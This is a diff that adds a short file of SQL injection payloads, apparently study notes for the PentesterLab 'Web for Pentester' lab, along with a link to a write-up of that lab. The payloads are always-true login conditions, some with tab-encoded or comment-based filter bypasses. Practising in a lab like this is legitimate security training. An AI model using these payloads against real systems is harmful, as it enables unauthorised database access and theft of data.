@@ -1,0 +1,5 @@
+name=root' or '1'='1' %23
+name=root'%09or%09'1'='1'%09%23
+name=root'/**/or/**/'1'='1'/**/%23
+id=-99 or 1=1
+http://wg135.github.io/blog/2016/02/20/pentesterlab-web-for-pentester-sql-injection/
